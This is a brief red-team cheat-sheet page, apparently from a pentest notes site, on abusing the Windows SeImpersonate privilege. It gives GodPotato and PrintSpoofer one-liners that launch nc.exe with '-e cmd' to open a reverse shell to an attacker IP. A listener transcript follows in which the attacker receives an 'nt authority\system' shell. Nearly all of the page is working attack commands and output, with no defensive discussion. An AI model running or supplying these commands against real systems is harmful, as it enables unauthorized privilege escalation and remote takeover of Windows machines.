title: SeImpersonate Privilege
parent: Attack Repository
grand_parent: Red Team
nav_order: 251
# ReverseShell

## Godpotato

```powershell
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.205 443 -e cmd"
```

or

## PrintSpoofer

```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\PrintSpoofer64.exe  -c ".\nc.exe 192.168.45.159 445 -e cmd"
```

```zsh
rlwrap -cAr nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.45.159] from (UNKNOWN) [192.168.219.147] 53430
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
